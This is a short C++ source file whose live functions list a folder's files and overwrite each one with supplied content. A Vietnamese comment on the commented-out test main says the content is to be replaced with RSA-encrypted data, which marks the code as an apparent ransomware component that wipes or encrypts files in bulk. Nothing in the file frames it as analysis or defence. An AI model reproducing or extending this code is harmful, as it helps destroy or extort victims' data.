#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>

namespace fs = std::filesystem;

struct FileItem {
    std::string name;
    bool isDirectory;
};

// Function to get a list of all files and directories in a specific path
std::vector<FileItem> listFilesAndDirectories(const std::string& path) {
    std::vector<FileItem> result;
    try {
        for (const auto& entry : fs::directory_iterator(path)) {
            if(fs::is_directory(entry.path())) {
                result.push_back({entry.path().filename().string(), true});
            } else {
                result.push_back({entry.path().filename().string(), false});
            }
        }
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
    return result;
}

// Function to read and print the content of a file
// void readFileContent(const std::string& filePath) {
//     std::ifstream file(filePath);
//     if (file) {
//         std::string line;
//         while (std::getline(file, line)) {
//             std::cout << line << std::endl;
//         }
//         file.close();
//     } else {
//         std::cerr << "Unable to open file: " << filePath << std::endl;
//     }
// }

// Function to modify and save content of a file
void modifyFileContent(const std::string& filePath, const std::string& content) {
    std::ofstream outFile(filePath);
    if (outFile) {
        outFile << content;
        outFile.close();
    } else {
        std::cerr << "Unable to open or create file: " << filePath << std::endl;
    }
}

// Function to traverse and modify if it is a file
void traverseAndModifyFiles(const std::vector<FileItem>& items, const std::string& currentPath, const std::string& content) {
    for (const auto& item : items) {
        if (!item.isDirectory) {
            modifyFileContent(currentPath + item.name, content); // Call function to modify file content
        }
    }
}

// Hàm main này dùng để test trực tiếp trong file, khi dùng bỏ note ra để dùng, content sẽ thay bằng đoạn mã hóa rsa.
// int main() {
//     std::string path = "C:\\test\\";

//     std::string content = "abcqsadjkdfghdafsdflsadljasljd";

//     std::vector<FileItem> filesAndDirs = listFilesAndDirectories(path);

//     traverseAndModifyFiles(filesAndDirs, path, content);

//     return 0;
// }
